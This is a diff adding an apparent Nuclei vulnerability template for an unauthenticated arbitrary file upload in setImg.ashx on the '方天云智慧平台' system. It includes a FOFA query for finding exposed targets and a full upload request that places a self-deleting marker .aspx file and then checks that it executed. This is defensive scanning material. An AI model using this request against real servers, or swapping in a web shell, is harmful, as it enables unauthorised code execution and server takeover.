@@ -1,0 +1,49 @@
+id: fangtianyunzhihui-setImg_ashx-File-upload
+
+info:
+  name: 方天云智慧平台系统 setImg.ashx 任意文件上传漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="AjaxMethods.asmx/GetCompanyItem"
+    方天云智慧平台系统 setImg.ashx 接口处存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486449&idx=1&sn=9f88cd32efd2b28a0a9649cb324cd69b&chksm=c267bec2f51037d470650f1adb4614ab2947a876f7157c672a03860effce616f7471aa829dab&token=1628549949&lang=zh_CN#rd
+  tags: File upload
+  
+http:
+  - raw:
+      - |
+        POST /Data/setImg.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
+
+        ------21909179191068471382830692394
+        Content-Disposition: form-data; name="Filedata"; filename="test.aspx"
+        Content-Type: image/jpeg
+
+        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------21909179191068471382830692394--
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+            - '(\d+/\d+/\d+/\d+/[a-zA-Z0-9-]+\.aspx)'
+         internal: true
+  - raw:
+      - |
+        GET /UploadFile/CustomerFile/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
